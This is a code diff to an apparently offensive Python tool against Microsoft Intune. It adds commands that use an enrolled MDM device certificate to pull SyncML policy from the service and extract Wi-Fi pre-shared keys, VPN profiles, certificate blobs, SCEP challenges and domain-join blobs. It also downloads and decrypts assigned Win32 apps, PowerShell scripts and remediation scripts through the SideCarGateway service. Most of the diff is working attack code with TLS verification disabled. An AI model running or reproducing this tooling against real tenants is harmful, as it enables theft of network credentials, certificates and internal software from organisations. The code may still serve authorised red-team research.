@@ -16,8 +16,12 @@ Global flags: --debug  --proxy http://127.0.0.1:8080
 
 import os
 import sys
+import io
 import json
 import uuid
+import gzip
+import struct
+import zipfile
 import base64
 import argparse
 import traceback
@@ -670,8 +674,252 @@ def cmd_phase4(args):
 
 
 # ----------------------
-# MDM checkin 
+# MDM checkin
 # ----------------------
+
+# ── SyncML intelligence extraction ───────────────────────────
+
+def _parse_round_xml(raw_xml):
+    """Parse raw SyncML XML bytes into a commands dict.
+    Mirrors device.parse_syncml() but standalone (no device object needed)."""
+    try:
+        parsed = xmltodict.parse(raw_xml)
+    except Exception:
+        return None
+    body = parsed.get('SyncML', {}).get('SyncBody', {})
+    if not body:
+        return None
+    cmds = {'Get': [], 'Atomic': [], 'Add': [], 'Replace': [],
+            'Exec': [], 'Sequence': [], 'Delete': []}
+    _collect_cmds_recursive(body, cmds)
+    return cmds if any(cmds.values()) else None
+
+
+def _collect_cmds_recursive(node, cmds):
+    for key in list(cmds.keys()):
+        if key not in node:
+            continue
+        val = node[key]
+        if key in ('Atomic', 'Sequence'):
+            items = val if isinstance(val, list) else [val]
+            for item in items:
+                cmds[key].append({'CmdID': item.get('CmdID', '')})
+                _collect_cmds_recursive(item, cmds)
+        else:
+            cmds[key].extend(val if isinstance(val, list) else [val])
+
+
+def _iter_items(cmds, cmd_type):
+    """Yield (loc_uri, data) for every item under a command type."""
+    for cmd in (cmds.get(cmd_type) or []):
+        raw_item = cmd.get('Item', {})
+        for it in (raw_item if isinstance(raw_item, list) else [raw_item]):
+            loc_uri = (it.get('Target') or {}).get('LocURI', '') or ''
+            data    = it.get('Data') or ''
+            yield loc_uri, str(data) if data else ''
+
+
+def _new_findings():
+    return {
+        'wifi':       [],   # {'loc_uri', 'xml', 'ssid', 'auth', 'psk', 'psk_protected'}
+        'vpn':        [],   # {'loc_uri', 'xml'}
+        'cert_blobs': [],   # {'loc_uri', 'blob'} — encrypted, not yet decrypted
+        'scep':       [],   # {'loc_uri', 'data'}
+        'scripts':    [],   # {'loc_uri', 'data', 'source'}
+        'msi_urls':   [],   # {'loc_uri', 'url'}
+        'odj':        None, # {'loc_uri', 'data'}
+        'exec_other': [],   # {'loc_uri', 'data'}
+        'policy':     [],   # {'loc_uri', 'value'} — Replace CSP values
+        'other_add':  [],   # {'loc_uri', 'value'} — unclassified Add
+    }
+
+
+def _extract_from_cmds(cmds, findings):
+    """Classify all Add/Replace/Exec items into findings."""
+    for loc_uri, data in _iter_items(cmds, 'Exec'):
+        uri_l = loc_uri.lower()
+        if 'downloadinstall' in uri_l and data:
+            start = data.find('<ContentURL>') + len('<ContentURL>')
+            end   = data.find('</ContentURL>')
+            if end > 0 and start < end:
+                url = data[start:end].strip().replace('&amp;', '&')
+                if 'IntuneWindowsAgent.msi' not in url:
+                    findings['msi_urls'].append({'loc_uri': loc_uri, 'url': url})
+        elif 'offlinedomainjoin' in uri_l and data:
+            if findings['odj'] is None:
+                findings['odj'] = {'loc_uri': loc_uri, 'data': data}
+        elif data:
+            findings['exec_other'].append({'loc_uri': loc_uri, 'data': data})
+
+    for cmd_type in ('Add', 'Replace'):
+        for loc_uri, data in _iter_items(cmds, cmd_type):
+            if not loc_uri or not data:
+                continue
+            uri_l = loc_uri.lower()
+            if 'wlanxml' in uri_l or ('wifi' in uri_l and 'profile' in uri_l):
+                entry = {'loc_uri': loc_uri, 'xml': data}
+                entry.update(_parse_wifi_xml(data))
+                findings['wifi'].append(entry)
+            elif 'vpnv2' in uri_l and ('profilexml' in uri_l or 'vpnprofile' in uri_l):
+                findings['vpn'].append({'loc_uri': loc_uri, 'xml': data})
+            elif 'pfxcert' in uri_l or ('certificateinstall' in uri_l and 'pfx' in uri_l):
+                findings['cert_blobs'].append({'loc_uri': loc_uri, 'blob': data})
+            elif 'scep' in uri_l:
+                findings['scep'].append({'loc_uri': loc_uri, 'data': data})
+            elif ('script' in uri_l.replace('windows', '') or
+                  'policybody' in uri_l or 'runscript' in uri_l):
+                findings['scripts'].append({'loc_uri': loc_uri, 'data': data, 'source': cmd_type})
+            elif cmd_type == 'Replace':
+                if 'nodecache' not in loc_uri.lower():
+                    findings['policy'].append({'loc_uri': loc_uri, 'value': data})
+            else:
+                if 'nodecache' not in loc_uri.lower():
+                    findings['other_add'].append({'loc_uri': loc_uri, 'value': data})
+
+
+def _parse_wifi_xml(xml_str):
+    """Extract SSID, auth type, and PSK from WlanXml."""
+    result = {'ssid': None, 'auth': None, 'psk': None, 'psk_protected': None}
+    try:
+        prof = xmltodict.parse(xml_str).get('WLANProfile', {})
+        ssid_node       = prof.get('SSIDConfig', {}).get('SSID', {})
+        result['ssid']  = ssid_node.get('name') or ssid_node.get('hex')
+        sec             = prof.get('MSM', {}).get('security', {})
+        result['auth']  = (sec.get('authEncryption') or {}).get('authentication')
+        shared          = sec.get('sharedKey') or {}
+        if shared:
+            result['psk']           = shared.get('keyMaterial')
+            result['psk_protected'] = str(shared.get('protected', 'true')).lower() == 'true'
+    except Exception:
+        pass
+    return result
+
+
+def _decode_odj_blob(b64_data):
+    """Extract readable strings from an ODJ blob (UTF-16LE encoded)."""
+    import re as _re
+    try:
+        raw  = base64.b64decode(b64_data)
+        text = raw.decode('utf-16-le', errors='ignore')
+        return _re.findall(r'[A-Za-z0-9][A-Za-z0-9.\-_@]{3,}', text)
+    except Exception:
+        return []
+
+
+def _display_and_save_findings(findings, out_dir=None):
+    anything = False
+
+    if findings['wifi']:
+        anything = True
+        log.section(f"Wi-Fi Profiles  ({len(findings['wifi'])} found)")
+        for i, w in enumerate(findings['wifi'], 1):
+            ssid = w.get('ssid') or '(unknown SSID)'
+            auth = w.get('auth') or '?'
+            log.alert(f"[{i}] SSID: {ssid}  Auth: {auth}")
+            psk = w.get('psk')
+            if psk:
+                if w.get('psk_protected'):
+                    log.warning(f"    PSK (DPAPI-encrypted): {psk[:80]}")
+                else:
+                    log.alert(f"    PSK (plaintext): {psk}")
+            if out_dir:
+                wd = os.path.join(out_dir, 'wifi')
+                os.makedirs(wd, exist_ok=True)
+                fname = _safe_name(ssid)
+                with open(os.path.join(wd, f'{fname}.xml'), 'w', encoding='utf-8') as f:
+                    f.write(w['xml'])
+                if psk and not w.get('psk_protected'):
+                    with open(os.path.join(wd, f'{fname}_psk.txt'), 'w', encoding='utf-8') as f:
+                        f.write(f"SSID: {ssid}\nPSK:  {psk}\n")
+                log.success(f"    Saved: wifi/{fname}.xml")
+
+    if findings['vpn']:
+        anything = True
+        log.section(f"VPN Profiles  ({len(findings['vpn'])} found)")
+        for i, v in enumerate(findings['vpn'], 1):
+            parts = v['loc_uri'].split('/')
+            name  = parts[-3] if len(parts) >= 3 else f'vpn_{i}'
+            log.alert(f"[{i}] {name}  ({v['loc_uri']})")
+            if out_dir:
+                vd = os.path.join(out_dir, 'vpn')
+                os.makedirs(vd, exist_ok=True)
+                fname = _safe_name(name)
+                with open(os.path.join(vd, f'{fname}.xml'), 'w', encoding='utf-8') as f:
+                    f.write(v['xml'])
+                log.success(f"    Saved: vpn/{fname}.xml")
+
+    if findings['cert_blobs']:
+        anything = True
+        log.section(f"Certificate Payloads  ({len(findings['cert_blobs'])} found)")
+        log.info("  (PFX decryption not yet implemented — blobs saved for manual analysis)")
+        for i, c in enumerate(findings['cert_blobs'], 1):
+            log.alert(f"[{i}] {c['loc_uri']}")
+            if out_dir:
+                cd = os.path.join(out_dir, 'certs')
+                os.makedirs(cd, exist_ok=True)
+                with open(os.path.join(cd, f'cert_{i}.b64'), 'w') as f:
+                    f.write(c['blob'])
+                log.success(f"    Saved raw blob: certs/cert_{i}.b64")
+
+    if findings['scep']:
+        anything = True
+        log.section(f"SCEP Challenges  ({len(findings['scep'])} found)")
+        for i, s in enumerate(findings['scep'], 1):
+            log.alert(f"[{i}] {s['loc_uri']}")
+            log.info(f"    {str(s['data'])[:200]}")
+
+    if findings['scripts']:
+        anything = True
+        log.section(f"Scripts  ({len(findings['scripts'])} found)")
+        for i, s in enumerate(findings['scripts'], 1):
+            log.alert(f"[{i}] {s['loc_uri']}  (via {s['source']})")
+            if out_dir:
+                sd = os.path.join(out_dir, 'scripts')
+                os.makedirs(sd, exist_ok=True)
+                raw_name = s['loc_uri'].split('/')[-1] or f'script_{i}'
+                fname = _safe_name(raw_name) + '.ps1'
+                with open(os.path.join(sd, fname), 'w', encoding='utf-8') as f:
+                    f.write(s['data'])
+                log.success(f"    Saved: scripts/{fname}")
+            else:
+                preview = s['data'][:120].replace('\n', ' ')
+                log.info(f"    {preview}{'...' if len(s['data']) > 120 else ''}")
+
+    if findings['msi_urls']:
+        anything = True
+        log.section(f"MSI / App Download URLs  ({len(findings['msi_urls'])} found)")
+        for i, m in enumerate(findings['msi_urls'], 1):
+            log.alert(f"[{i}] {m['url']}")
+
+    if findings['odj']:
+        anything = True
+        log.section("Offline Domain Join Blob")
+        strings = _decode_odj_blob(findings['odj']['data'])
+        log.alert("Strings extracted from ODJ blob:")
+        for s in strings:
+            print(f"  {s}")
+        if out_dir:
+            with open(os.path.join(out_dir, 'odj_blob.b64'), 'w') as f:
+                f.write(findings['odj']['data'])
+            with open(os.path.join(out_dir, 'odj_strings.txt'), 'w', encoding='utf-8') as f:
+                f.write('\n'.join(strings))
+            log.success(f"Saved: odj_blob.b64  and  odj_strings.txt")
+
+    if findings['policy'] and out_dir:
+        pol_path = os.path.join(out_dir, 'policy_values.json')
+        with open(pol_path, 'w', encoding='utf-8') as f:
+            json.dump(findings['policy'], f, indent=2)
+        log.success(f"Replace values ({len(findings['policy'])} entries) saved: policy_values.json")
+
+    if findings['other_add'] and out_dir:
+        add_path = os.path.join(out_dir, 'add_values.json')
+        with open(add_path, 'w', encoding='utf-8') as f:
+            json.dump(findings['other_add'], f, indent=2)
+        log.success(f"Add values ({len(findings['other_add'])} entries) saved: add_values.json")
+
+    if not anything:
+        log.info("No notable intelligence extracted from SyncML responses")
+
 
 def _device_name_from_cert_path(cert_path):
     """Derive device name from MDM cert filename.
@@ -741,34 +989,120 @@ def cmd_phase5(args):
         log.info("No -r provided - device will have no primary user")
 
     output_path = getattr(args, 'output', None)
+    out_dir     = getattr(args, 'output_dir', None)
+    save_syncml = getattr(args, 'save_syncml', None)
+
+    if save_syncml:
+        os.makedirs(save_syncml, exist_ok=True)
+    if out_dir:
+        os.makedirs(out_dir, exist_ok=True)
+
+    if output_path:
+        out_file = open(output_path, 'w', encoding='utf-8')
+        sys.stdout = _Tee(sys.__stdout__, out_file)
+
     try:
         device = make_windows_device(device_name, uid, tenant)
         apply_profile(device, profile)
         if user_at:
             device.aad_user_token = user_at
-        log.info("Starting SyncML loop...")
 
-        if output_path:
-            out_file = open(output_path, 'w', encoding='utf-8')
-            sys.stdout = _Tee(sys.__stdout__, out_file)
-        try:
-            device.checkin(mdm_pfx_path)
-        finally:
-            if output_path:
-                sys.stdout = sys.__stdout__
-                out_file.close()
-                log.info(f"Checkin output written to {output_path}")
+        findings  = _new_findings()
+        imei      = str(uuid.uuid4())
+        msgid     = 1
+        sessionid = 1
+        syncml_data = device.generate_initial_syncml(sessionid, imei)
+
+        log.info("Starting SyncML loop...")
+        while True:
+            log.info(f"send request #{msgid}")
+            syncml_data = device.send_syncml(syncml_data, cert_out, key_out)
+
+            if b'Unenroll' in syncml_data:
+                log.alert("Unenroll command received!")
+
+            if b'Bad Request' in syncml_data:
+                log.warning("Bad Request response — ending loop")
+                break
+
+            if save_syncml:
+                rpath = os.path.join(save_syncml, f'round_{msgid:03d}.xml')
+                with open(rpath, 'wb') as f:
+                    f.write(syncml_data)
+                log.debug(f"SyncML round saved: {rpath}")
+
+            cmds = device.parse_syncml(syncml_data)
+            if cmds is None:
+                break
+
+            _extract_from_cmds(cmds, findings)
+            msgid += 1
+            syncml_data = device.generate_syncml_response(msgid, sessionid, imei, cmds)
+
+        log.info("checkin ended!")
+        _display_and_save_findings(findings, out_dir)
 
     except Exception as e:
         log.error(f"checkin(): {type(e).__name__}: {e}")
         if DEBUG:
             traceback.print_exc()
     finally:
+        if output_path:
+            sys.stdout = sys.__stdout__
+            out_file.close()
+            log.info(f"Checkin output written to {output_path}")
         _cleanup_temp_files(cert_out, key_out)
 
     log.success("Complete")
-    print()
-    log.info("Done — check output for profiles, MSI URLs, ODJ blob")
+
+
+# ----------------------
+# Parse saved SyncML rounds
+# ----------------------
+
+def cmd_parse_checkin(args):
+    log.section("Parse SyncML Rounds")
+
+    xml_dir  = getattr(args, 'dir',        None)
+    xml_file = getattr(args, 'file',       None)
+    out_dir  = getattr(args, 'output_dir', None)
+
+    xml_files = []
+    if xml_file:
+        xml_files = [xml_file]
+    elif xml_dir:
+        try:
+            xml_files = sorted([
+                os.path.join(xml_dir, f)
+                for f in os.listdir(xml_dir)
+                if f.endswith('.xml')
+            ])
+        except Exception as e:
+            log.error(f"Cannot read directory: {e}")
+            sys.exit(1)
+
+    if not xml_files:
+        log.error("No XML files found — use --dir DIR or --file FILE")
+        sys.exit(1)
+
+    if out_dir:
+        os.makedirs(out_dir, exist_ok=True)
+
+    log.info(f"Parsing {len(xml_files)} SyncML round(s)...")
+    findings = _new_findings()
+    for fpath in xml_files:
+        log.info(f"  {fpath}")
+        try:
+            with open(fpath, 'rb') as f:
+                raw = f.read()
+        except Exception as e:
+            log.warning(f"  Could not read {fpath}: {e}")
+            continue
+        cmds = _parse_round_xml(raw)
+        if cmds:
+            _extract_from_cmds(cmds, findings)
+
+    _display_and_save_findings(findings, out_dir)
 
 
 # ----------------------
@@ -1095,6 +1429,317 @@ def cmd_retire_intune(args):
             traceback.print_exc()
         sys.exit(1)
 
+# -------------------------
+# IME SideCarGateway — download apps & remediations
+# -------------------------
+
+def _safe_name(s):
+    """Strip characters unsafe for filenames."""
+    import re
+    return re.sub(r'[^\w\-.]', '_', str(s))
+
+
+def aes_decrypt(enc_key_b64, iv_b64, ciphertext):
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    key = base64.b64decode(enc_key_b64)
+    iv  = base64.b64decode(iv_b64)
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+    d = cipher.decryptor()
+    plaintext = d.update(ciphertext) + d.finalize()
+    return plaintext[: -plaintext[-1]]  # strip PKCS7 padding
+
+
+class IME:
+    _SIDECAR_SERVICE  = 'SideCarGatewayService'
+    _SERVICE_ADDR_URL = (
+        'https://manage.microsoft.com/RestUserAuthLocationService'
+        '/RestUserAuthLocationService/Certificate/ServiceAddresses'
+    )
+
+    def __init__(self, device_name, certpath, keypath):
+        self.device_name = device_name
+        self.certpath    = certpath
+        self.keypath     = keypath
+
+    def _request_body(self, sessionid, gateway_api, request_payload=None):
+        return {
+            'Key':                 sessionid,
+            'SessionId':           sessionid,
+            'RequestContentType':  gateway_api,
+            'RequestPayload':      '[]' if request_payload is None else json.dumps(request_payload),
+            'ResponseContentType': None,
+            'ClientInfo': json.dumps({
+                'DeviceName':             self.device_name,
+                'OperatingSystemVersion': '10.0.19045',
+                'SideCarAgentVersion':    '1.83.107.0',
+                'Win10SMode':             False,
+                'UnlockWin10SModeTenantId':  None,
+                'UnlockWin10SModeDeviceId':  None,
+                'ChannelUriInformation':     None,
+                'AgentExecutionStartTime':   '10/11/2024 23:15:42',
+                'AgentExecutionEndTime':     '10/11/2024 23:15:38',
+                'AgentCrashSeen':            True,
+                'ExtendedInventoryMap': {
+                    'OperatingSystemRevisionNumber': '2006',
+                    'SKU':                          '72',
+                    'DotNetFrameworkReleaseValue':   '528372',
+                },
+            }),
+            'ResponsePayload':         None,
+            'EnabledFlights':          None,
+            'CheckinIntervalMinutes':  None,
+            'GenericWorkloadRequests': None,
+            'GenericWorkloadResponse': None,
+            'CheckinReason':           'AgentRestart',
+            'CheckinReasonPayload':    None,
+        }
+
+    def _sidecar_url(self):
+        resp = requests.get(
+            self._SERVICE_ADDR_URL,
+            cert=(self.certpath, self.keypath),
+            verify=False,
+            proxies=PROXY,
+        )
+        resp.raise_for_status()
+        for svc in resp.json()[0]['Services']:
+            if svc['ServiceName'] == self._SIDECAR_SERVICE:
+                return svc['Url']
+        raise RuntimeError('SideCarGatewayService not found in ServiceAddresses response')
+
+    def _put(self, url, sessionid, body):
+        resp = requests.put(
+            url=f"{url}/SideCarGatewaySessions('{sessionid}')?api-version=1.5",
+            cert=(self.certpath, self.keypath),
+            data=json.dumps(body),
+            headers={'Content-Type': 'application/json', 'Prefer': 'return-content'},
+            verify=False,
+            proxies=PROXY,
+        )
+        resp.raise_for_status()
+        return resp
+
+    def _decompress(self, compressed_b64):
+        buf      = base64.b64decode(compressed_b64)
+        data_len = struct.unpack('I', buf[:4])[0]
+        with gzip.GzipFile(fileobj=io.BytesIO(buf[4:]), mode='rb') as gz:
+            return gz.read(data_len).decode('utf-8')
+
+    def _decrypt_content_info(self, decrypt_xml):
+        from asn1crypto import cms as asn1_cms
+        from cryptography.hazmat.primitives.serialization import load_pem_private_key
+        from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        from cryptography.hazmat.primitives.ciphers.algorithms import TripleDES
+
+        start   = decrypt_xml.find('<EncryptedContent>') + len('<EncryptedContent>')
+        end     = decrypt_xml.find('</EncryptedContent>')
+        cms_der = base64.b64decode(decrypt_xml[start:end].strip())
+
+        with open(self.keypath, 'rb') as f:
+            private_key = load_pem_private_key(f.read(), password=None)
+
+        content_info = asn1_cms.ContentInfo.load(cms_der)
+        env_data     = content_info['content']
+
+        cek = None
+        for ri in env_data['recipient_infos']:
+            try:
+                enc_key = bytes(ri.chosen['encrypted_key'])
+                cek     = private_key.decrypt(enc_key, asym_padding.PKCS1v15())
+                break
+            except Exception:
+                continue
+        if cek is None:
+            raise RuntimeError('No matching RecipientInfo found in CMS EnvelopedData')
+
+        enc_content_info = env_data['encrypted_content_info']
+        alg_params       = enc_content_info['content_encryption_algorithm']['parameters']
+        iv               = alg_params.native
+        enc_data         = bytes(enc_content_info['encrypted_content'])
+
+        if len(iv) == 8:
+            cipher = Cipher(TripleDES(cek), modes.CBC(iv))
+        else:
+            cipher = Cipher(algorithms.AES(cek), modes.CBC(iv))
+        decryptor = cipher.decryptor()
+        plaintext = decryptor.update(enc_data) + decryptor.finalize()
+        plaintext = plaintext[: -plaintext[-1]]
+        return json.loads(plaintext.decode('utf-8'))
+
+    # -- public API --
+
+    def get_scripts(self):
+        url = self._sidecar_url()
+        sid = str(uuid.uuid4())
+        resp = self._put(url, sid, self._request_body(sid, 'PolicyRequest'))
+        return json.loads(resp.json()['ResponsePayload'])
+
+    def get_remediation_scripts(self):
+        url = self._sidecar_url()
+        sid = str(uuid.uuid4())
+        resp = self._put(url, sid, self._request_body(sid, 'GetScript'))
+        return json.loads(resp.json()['ResponsePayload'])
+
+    def get_apps(self):
+        url = self._sidecar_url()
+        sid = str(uuid.uuid4())
+        resp = self._put(url, sid, self._request_body(sid, 'GetSelectedApp'))
+        return json.loads(self._decompress(resp.json()['ResponsePayload']))
+
+    def get_content_info(self, app):
+        url = self._sidecar_url()
+        with open(self.certpath, 'rb') as f:
+            cert = x509.load_pem_x509_certificate(f.read(), default_backend())
+        cert_b64 = base64.b64encode(cert.public_bytes(Encoding.DER)).decode()
+        payload = {
+            'ApplicationId':          app['Id'],
+            'ApplicationVersion':     app['Version'],
+            'Intent':                 app['Intent'],
+            'CertificateBlob':        cert_b64,
+            'ContentInfo':            None,
+            'SecondaryContentInfo':   None,
+            'DecryptInfo':            None,
+            'UploadLocation':         None,
+            'TargetingMethod':        0,
+            'ErrorCode':              None,
+            'TargetType':             2,
+            'InstallContext':         2,
+            'EspPhase':               2,
+            'ApplicationName':        app['Name'],
+            'AssignmentFilterIds':    None,
+            'ManagedInstallerStatus': 1,
+            'ApplicationEnforcement': 0,
+        }
+        sid  = str(uuid.uuid4())
+        resp = self._put(url, sid, self._request_body(sid, 'GetContentInfo', payload))
+        return json.loads(resp.json()['ResponsePayload'])
+
+    def download_app(self, app_name, upload_url, enc_key, iv, extract_dir=None):
+        resp = requests.get(upload_url, verify=False, proxies=PROXY)
+        data = aes_decrypt(enc_key, iv, resp.content[48:])
+        buf  = io.BytesIO(data)
+        if extract_dir and zipfile.is_zipfile(buf):
+            buf.seek(0)
+            with zipfile.ZipFile(buf) as zf:
+                zf.extractall(extract_dir)
+            return extract_dir
+        out = os.path.join(extract_dir, f'{app_name}.bin') if extract_dir else f'{app_name}.bin'
+        with open(out, 'wb') as f:
+            f.write(data)
+        return out
+
+
+def _ime_from_state(args):
+    state    = load_state()
+    mdm_pfx  = getattr(args, 'cert', None) or state.get('mdm_pfx_path')
+    if not mdm_pfx or not os.path.exists(mdm_pfx):
+        log.error("MDM PFX not found — run mdm-enroll first or pass --cert <mdm.pfx>")
+        sys.exit(1)
+    device_name = _device_name_from_cert_path(mdm_pfx) if getattr(args, 'cert', None) else state.get('device_name', 'UNKNOWN')
+    cert_tmp = f'_ime_cert_{uuid.uuid4().hex[:8]}.pem'
+    key_tmp  = f'_ime_key_{uuid.uuid4().hex[:8]}.pem'
+    extract_pem_python(mdm_pfx, cert_tmp, key_tmp)
+    return IME(device_name, cert_tmp, key_tmp), cert_tmp, key_tmp
+
+
+def cmd_download_apps(args):
+    log.section("Download Apps + Scripts")
+    ime, cert_tmp, key_tmp = _ime_from_state(args)
+    try:
+        log.info("Fetching assigned PowerShell scripts (PolicyRequest)...")
+        scripts = ime.get_scripts()
+        if not scripts:
+            log.warning("No PowerShell scripts assigned to this device")
+        else:
+            log.success(f"{len(scripts)} script(s) found")
+            scripts_dir = os.path.join(os.getcwd(), 'scripts')
+            os.makedirs(scripts_dir, exist_ok=True)
+            for i, s in enumerate(scripts, 1):
+                policy_id = s.get('PolicyId', f'script_{i}')
+                fname     = f"{_safe_name(policy_id)}.ps1"
+                out       = os.path.join(scripts_dir, fname)
+                with open(out, 'w', encoding='utf-8') as f:
+                    f.write(s.get('PolicyBody', ''))
+                log.success(f"Saved script: scripts/{fname}  (PolicyId: {policy_id})")
+
+        log.info("Fetching assigned Win32 apps (GetSelectedApp)...")
+        apps = ime.get_apps()
+        if not apps:
+            log.warning("No Win32 apps assigned to this device")
+        else:
+            log.success(f"{len(apps)} app(s) found")
+            apps_dir = os.path.join(os.getcwd(), 'apps')
+            os.makedirs(apps_dir, exist_ok=True)
+            for app in apps:
+                app_dir = os.path.join(apps_dir, _safe_name(app['Name']))
+                os.makedirs(app_dir, exist_ok=True)
+                log.info(f"App: {app['Name']}  Id: {app['Id']}  Version: {app['Version']}")
+                log.info("Fetching content info...")
+                content      = ime.get_content_info(app)
+                upload_url   = json.loads(content['ContentInfo'])['UploadLocation']
+                decrypt_info = ime._decrypt_content_info(content['DecryptInfo'])
+                log.info("Downloading and extracting from CDN...")
+                result = ime.download_app(
+                    app['Name'], upload_url,
+                    decrypt_info['EncryptionKey'], decrypt_info['IV'],
+                    app_dir
+                )
+                if result == app_dir:
+                    extracted = os.listdir(app_dir)
+                    log.success(f"Extracted to apps/{_safe_name(app['Name'])}/  ({', '.join(extracted)})")
+                else:
+                    log.success(f"Saved: apps/{_safe_name(app['Name'])}/{os.path.basename(result)}")
+    except Exception as e:
+        log.error(f"download-apps: {type(e).__name__}: {e}")
+        if DEBUG:
+            traceback.print_exc()
+    finally:
+        _cleanup_temp_files(cert_tmp, key_tmp)
+
+
+def cmd_get_remediations(args):
+    log.section("Download Remediation Scripts")
+    ime, cert_tmp, key_tmp = _ime_from_state(args)
+    try:
+        log.info("Fetching remediation scripts (GetScript)...")
+        scripts = ime.get_remediation_scripts()
+        if not scripts:
+            log.warning("No remediation scripts assigned to this device")
+        else:
+            log.success(f"{len(scripts)} remediation script(s) found")
+            rem_dir = os.path.join(os.getcwd(), 'remediations')
+            os.makedirs(rem_dir, exist_ok=True)
+            for i, s in enumerate(scripts, 1):
+                policy_id  = s.get('PolicyId', f'policy_{i}')
+                policy_dir = os.path.join(rem_dir, _safe_name(policy_id))
+                os.makedirs(policy_dir, exist_ok=True)
+
+                def _decode(val):
+                    try:
+                        return base64.b64decode(val).decode('utf-8')
+                    except Exception:
+                        return val or ''
+
+                with open(os.path.join(policy_dir, 'detection.ps1'), 'w', encoding='utf-8') as f:
+                    f.write(_decode(s.get('PolicyBody', '')))
+                with open(os.path.join(policy_dir, 'remediation.ps1'), 'w', encoding='utf-8') as f:
+                    f.write(_decode(s.get('RemediationScript', '')))
+                with open(os.path.join(policy_dir, 'params.json'), 'w', encoding='utf-8') as f:
+                    json.dump({
+                        'PolicyId':                    policy_id,
+                        'PolicyScriptParameters':      s.get('PolicyScriptParameters', ''),
+                        'RemediationScriptParameters': s.get('RemediationScriptParameters', ''),
+                    }, f, indent=2)
+                log.success(f"Saved: remediations/{_safe_name(policy_id)}/  (detection.ps1, remediation.ps1, params.json)")
+    except Exception as e:
+        log.error(f"get-remediations: {type(e).__name__}: {e}")
+        if DEBUG:
+            traceback.print_exc()
+    finally:
+        _cleanup_temp_files(cert_tmp, key_tmp)
+
+
 def cmd_status(args):
     log.section("Chain Status")
     if not os.path.exists(STATE_FILE):
@@ -1165,6 +1810,12 @@ _EPILOG = """\
 -----------------------------------------------------------------------------
   check   -u user@balh.com -r <refresh_token>     # MFA refresh token
   check   -u user@balh.com -p Password1!          # ROPC (may fail CA)
+
+-----------------------------------------------------------------------------
+  IME SIDECARGATEWAY  (MDM cert only — no user token required)
+-----------------------------------------------------------------------------
+  download-apps     [--cert mdm.pfx]   # Win32 apps + PowerShell scripts -> apps/ scripts/
+  get-remediations  [--cert mdm.pfx]   # proactive remediation scripts   -> remediations/
 
 -----------------------------------------------------------------------------
   CLEANUP
@@ -1268,7 +1919,11 @@ def main():
                     help=f'Client ID that issued the -r refresh token  '
                     )
     p5.add_argument('-o', '--output', metavar='FILE', default=None,
-                    help='Write checkin output (profiles, MSI URLs, ODJ blob) to FILE in addition to stdout')
+                    help='Write checkin output to FILE in addition to stdout')
+    p5.add_argument('--save-syncml', dest='save_syncml', metavar='DIR', default=None,
+                    help='Save raw SyncML XML response per round to DIR  (for offline parse-checkin)')
+    p5.add_argument('-O', '--output-dir', dest='output_dir', metavar='DIR', default=None,
+                    help='Save extracted artefacts (Wi-Fi, VPN, scripts, certs, ODJ) to DIR')
     p5.set_defaults(func=cmd_phase5)
 
     pc = sub.add_parser('check', help='Query Intune compliance state for the enrolled device',
@@ -1311,6 +1966,30 @@ def main():
     pr_adv.add_argument('--iw-url', metavar='URL')
     pr_adv.add_argument('--renewal-url', metavar='URL')
     pr.set_defaults(func=cmd_retire_intune)
+
+    pda = sub.add_parser('download-apps',
+                         help='Download assigned Win32 apps and PowerShell scripts via IME SideCarGateway',
+                         formatter_class=argparse.RawDescriptionHelpFormatter)
+    pda.add_argument('--cert', metavar='FILE', default=None,
+                     help='MDM PFX path  (default: mdm_pfx_path from state)')
+    pda.set_defaults(func=cmd_download_apps)
+
+    pgr = sub.add_parser('get-remediations',
+                          help='Download assigned proactive remediation scripts via IME SideCarGateway',
+                          formatter_class=argparse.RawDescriptionHelpFormatter)
+    pgr.add_argument('--cert', metavar='FILE', default=None,
+                     help='MDM PFX path  (default: mdm_pfx_path from state)')
+    pgr.set_defaults(func=cmd_get_remediations)
+
+    ppc = sub.add_parser('parse-checkin',
+                         help='Parse saved SyncML XML rounds and extract intelligence',
+                         formatter_class=argparse.RawDescriptionHelpFormatter)
+    ppc_grp = ppc.add_mutually_exclusive_group(required=True)
+    ppc_grp.add_argument('--dir',  metavar='DIR',  help='Directory of round_NNN.xml files (from --save-syncml)')
+    ppc_grp.add_argument('--file', metavar='FILE', help='Single SyncML XML file')
+    ppc.add_argument('-O', '--output-dir', dest='output_dir', metavar='DIR', default=None,
+                     help='Save extracted artefacts to DIR')
+    ppc.set_defaults(func=cmd_parse_checkin)
 
     ps = sub.add_parser('status', help='Show chain progress and saved artefacts',
                         formatter_class=argparse.RawDescriptionHelpFormatter)
